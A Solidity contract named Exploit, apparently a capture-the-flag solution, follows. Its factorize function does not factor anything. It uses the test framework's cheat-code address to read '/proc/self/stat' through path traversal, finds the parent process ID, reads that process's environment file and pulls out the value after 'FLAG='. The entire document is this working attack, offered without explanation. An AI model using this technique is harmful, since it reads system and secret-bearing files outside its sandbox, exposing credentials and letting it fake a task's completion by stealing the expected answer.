interface VmLike {
    function readFile(string memory) external view returns (string memory);
}

contract Exploit {
    function factorize(uint) public returns (uint a, uint b) {
        VmLike vm = VmLike(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));
        bytes memory data = bytes(vm.readFile("../../../../../proc/self/stat"));

        uint spaces = 0;

        uint ppidStart;
        uint ppidEnd;
        for (uint i = 0; i < data.length; i++) {
            if (uint8(data[i]) == 0x20) {
                spaces++;

                if (spaces == 3) {
                    ppidStart = i + 1;
                } else if (spaces == 4) {
                    ppidEnd = i;
                    break;
                }
            }
        }

        assembly {
            data := add(data, ppidStart)
            mstore(data, sub(ppidEnd, ppidStart))
        }

        data = bytes(vm.readFile(string(abi.encodePacked("../../../../../proc/", data, "/environ"))));

        uint start;
        for (start = 0; start < data.length - 5; start++) {
            if (data[start] == 'F' && data[start + 1] == 'L' && data[start + 2] == 'A' && data[start + 3] == 'G' && data[start + 4] == '=') break;
        }

        assembly {
            a := mload(add(add(data, 0x20), add(start, 0x05)))
            b := mload(add(add(data, 0x20), add(start, 0x25)))
        }
    }
}